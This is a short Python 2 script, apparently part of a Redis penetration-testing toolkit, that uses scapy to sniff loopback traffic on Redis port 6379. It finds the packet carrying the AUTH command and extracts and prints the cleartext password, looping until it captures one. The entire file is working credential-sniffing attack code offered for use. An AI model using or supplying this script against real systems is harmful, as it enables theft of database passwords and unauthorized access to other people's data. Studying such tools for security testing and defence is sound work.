from scapy.all import *
import re
import hashlib
from termcolor import colored
import sys
import os
def get_packets(port, iface, count):
	packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
	return packets

def parse_packets(port, iface, count):
	passw=""
	packet=""
	packets = get_packets(port, iface, count)
	for i in xrange(len(packets)):
		if "AUTH" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
			packet=packets[i]
			break
		else:
			pass
	passw = re.findall(r'[A-Za-z0-9@!#$%^&*()]{5,}', str(packet))
	if len(passw)==0:
		return 0
	else: 
		print colored("[-] Obtained Password:"+str(passw[0]),'green')
		return 1

def sniff_redis():
	print colored("[-] Getting Packets",'blue')
	print colored("[-] Sniffing packages...",'blue')
	print colored("[-] Parse packages...",'blue')
	os.getcwd()
	val=parse_packets("6379", "lo", 3) 
	while True:
		if val==1:
			print colored("[-] Sniff Completed \n",'green');
			break
		else: 
			val=parse_packets("6379", "lo", 3)


